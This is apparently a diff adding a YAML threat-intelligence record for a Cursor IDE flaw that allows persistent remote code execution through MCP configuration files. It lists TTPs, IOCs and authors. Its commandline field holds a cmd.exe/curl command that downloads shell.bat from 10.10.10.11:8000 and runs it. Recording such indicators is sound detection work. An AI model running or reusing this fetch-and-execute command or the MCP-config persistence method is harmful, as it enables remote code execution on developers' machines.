@@ -1,0 +1,38 @@
+description: 'Cursor IDE vulnerability allows persistent remote code execution through
+  MCP configuration files.
+
+  '
+TTPs:
+  processes:
+  - calc.exe
+  - cmd.exe
+  commandline:
+  - cmd.exe /c curl http://10.10.10.11:8000/shell.bat -o XTEMPX\\shell.bat && XTEMPX\\shell.bat
+  powershell: null
+  scripting_engine: null
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - process: cmd.exe
+    destination: http://10.10.10.11:8000/shell.bat
+    port: 8000
+  file_activity:
+  - XTEMPX\\shell.bat
+  persistence:
+  - MCP configuration files in .cursor/rules/mcp.json
+  pipes: null
+  process_relations: null
+IOCs:
+  hashes: null
+  IPs:
+  - 10.10.10.11
+  domains: null
+  URLs:
+  - http://10.10.10.11:8000/shell.bat
+authors:
+- Andrey Charikov
+- Roman Zaikin
+- Oded Vanunu
+reference: https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/
+date_of_publication: August 05, 2025
+file_creation_date: August 12, 2025
